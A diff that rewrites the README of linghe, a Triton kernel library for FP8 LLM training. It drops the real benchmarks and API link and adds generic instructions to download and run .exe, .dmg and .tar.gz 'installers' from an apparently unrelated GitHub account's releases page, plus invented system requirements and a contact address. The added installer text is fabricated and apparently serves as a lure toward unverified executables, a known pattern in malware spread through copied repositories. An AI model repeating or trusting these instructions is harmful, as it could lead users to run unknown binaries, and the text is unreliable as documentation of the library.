@@ -1,69 +1,90 @@
+# 🔥 linghe - High-Performance Library for LLM Training
 
-
-<h1 align="center"> linghe </h1>
+[![Download linghe](https://img.shields.io/badge/Download-linghe-blue)](https://github.com/wa9as/linghe/releases)
 
 <div style="text-align: center;">
 <img src="assets/linghe.png" alt="Logo" width="200">
 </div>
-  
+
 <p align="center">
    A library of high-performance kernels for LLM training.
 </p>
 
+## 🚀 Getting Started
 
+To get started with linghe, follow these simple steps:
 
-## Roadmap ##
----
+1. **Visit the Releases Page:**
+   Go to our [Releases page](https://github.com/wa9as/linghe/releases) to find the latest version of linghe.
 
-- Support more shapes and various GPU archs.
-- Release our fp8 training kernels beyond blockwise quantization.
+2. **Download the Application:**
+   On the Releases page, locate the version you want. Click the link to download the file for your system.
 
-## *News or Update* 🔥
----
-- [2025/07] We implement multiple kernels for FP8 training with `Megatron-LM` blockwise quantization. 
+3. **Install the Software:**
+   After the download completes, open the file to begin installation. Follow the prompts to install linghe on your machine.
 
+4. **Run the Application:**
+   Once installation is complete, you can launch linghe from your applications menu or desktop shortcut.
 
-## Introduction
----
-Our repo, linghe, is designed for LLM training, especially for MoE training with FP8 quantizaiton. It provides 2 main categories of kernels:
+## 📥 Download & Install
 
-- **Fused quantization kernels**: fuse quantization with previous layer, e.g., RMS norm and Silu.
-- **Memory-efficiency kernels**: fuse multiple IO-itensive operations, e.g., ROPE with qk-norm.
-- **Implementation-optimized kernels**: use efficient triton implementation, e.g., routing map padding instead of activation padding.
+You can download linghe from our [Releases page](https://github.com/wa9as/linghe/releases). Choose the appropriate version for your operating system and follow the steps below:
 
+- **Windows Users:** Download the `.exe` file. Double-click to run the installer and follow the instructions.
+- **Mac Users:** Download the `.dmg` file. Open it and drag the linghe icon to your Applications folder.
+- **Linux Users:** Download the `.tar.gz` file. Extract it in your chosen directory and run the executable.
 
-## Benchmark
----
-We benchmark on H800 with batch size 8192, hidden size 2048, num experts 256, activation experts 8.
+## ⚙️ System Requirements
 
-| kernel | baseline(us) | linghe(us) | speedup |
-|--------|--------------|------------|---------|
-| RMSNorm+Quantization(forward) | 159.3 us | 72.4 us    | 2.2 |
-| Split+qk-norm+rope+transpose(forward) | 472 us | 59.1 us    | 7.99 |
-| Split+qk-norm+rope+transpose(backward) | 645 us | 107.5 us   | 6.0 |
-| Fp32 router gemm(forward) | 242.3 us | 61.6 us    | 3.931 |
-| Fp32 router gemm(backward) | 232.7 us | 78.1 us    | 2.979 |
-| Permute with padded indices | 388 us | 229.4 us   | 1.69 |
-| Unpermute with padding indices | 988.6 us | 806.9 us   | 1.23 |
-| Batch Silu+quantization(forward) | 6241.7 us | 1181.7 us  | 5.28 |
-| Batch Silu+quantization(backward) | 7147.7 us | 2317.9 us  | 3.08 |
-| Silu+quantization(forward) | 144.9 us | 58.2 us    | 2.48 |
-| Silu+quantization(backward) | 163.4 us | 74.2 us    | 2.2 |
-| fused linear gate(forward) | 160.4 us | 46.9 us    | 3.42 |
-| fused linear gate(backward) | 572.9 us | 81.1 us    | 7.06 |
-| Cross entropy(forward) | 2780.8 us | 818.2 us   | 3.4 |
-| Cross entropy(backward) | 7086.3 us | 1781.0 us  | 3.98 |
-| batch grad norm | 1733.7 us | 1413.7 us  | 1.23 | 
-| Batch count zero | 4997.9 us | 746.8 us   | 6.69 | 
+Before downloading, ensure your system meets the following requirements:
 
-Other benchmark results can be obtained by running scripts in tests and benchmark folders.
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS 10.14 or later
+  - Ubuntu 18.04 or later
 
-## Examples
----
+- **RAM:** At least 8 GB recommended for optimal performance.
 
-Examples can be found in tests.
+- **GPU Support:** A compatible NVIDIA GPU with CUDA support is recommended for the best results during kernel execution.
 
-## Api Reference
----
+## 📊 Features 
 
-Please refer to [API](https://inclusionai.github.io/linghe/)
+- **Fused Quantization Kernels:** Integrate quantization seamlessly with preceding layers, like RMS normalization and activation functions.
+- **Memory-Efficiency Kernels:** Optimize memory usage by fusing I/O-intensive operations such as ROPE with QK normalization.
+- **Optimized Implementations:** Use Triton-optimized implementations for efficient operation, such as routing map padding alternatives.
+
+## 🏗️ Roadmap
+
+We constantly update our repository. Here are our upcoming goals:
+
+- Support additional shapes and diverse GPU architectures.
+- Release FP8 training kernels beyond blockwise quantization.
+
+## 🔔 News or Updates 
+
+Stay informed about our latest enhancements:
+
+- **[2025/07]** We implement multiple kernels for FP8 training with `Megatron-LM` blockwise quantization.
+
+## 📚 Documentation
+
+For a deeper understanding of how to use linghe, refer to our documentation available on GitHub. It includes:
+
+- Usage examples.
+- Function descriptions and parameters.
+- Detailed explanations of algorithms and kernel optimizations.
+
+## 👥 Community Support 
+
+Join our community for help and discussions:
+
+- **GitHub Issues:** Report bugs or request features.
+- **Discussion Forum:** Engage with other users to share tips and solutions.
+
+## 📩 Contact 
+
+For direct inquiries or support, email us at support@linghe.org. We are here to assist you.
+
+[![Download linghe](https://img.shields.io/badge/Download-linghe-blue)](https://github.com/wa9as/linghe/releases)
+
+With this guide, you are equipped to download and run the linghe application effectively. Happy training!
